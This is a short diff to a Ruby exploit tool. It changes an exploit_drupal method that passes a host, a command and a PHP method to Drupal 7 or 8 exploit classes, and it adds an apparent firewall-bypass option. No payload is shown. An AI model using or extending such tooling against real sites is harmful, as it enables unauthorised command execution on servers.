@@ -268,14 +268,17 @@ module Options
   # 
   # FIXME: what about authentication?
   # 
-  def exploit_drupal(version, target, command, php_method, form_path)
+  def exploit_drupal(version, *args)
+    host, command, php_method, 
+    form_path, cf_bypass       = args 
+    
     case version
     when "7"
-      Drupal7.new(target, command, php_method, form_path).exploit
+      Drupal7.new(host, command, php_method, form_path, cf_bypass).exploit
     when "8"
-      Drupal8.new(target, command, php_method, form_path).exploit
+      Drupal8.new(host, command, php_method, form_path, cf_bypass).exploit
     else
-      Drupal8.new(target, command, php_method, form_path).exploit
+      Drupal8.new(host, command, php_method, form_path, cf_bypass).exploit
     end
   end
 
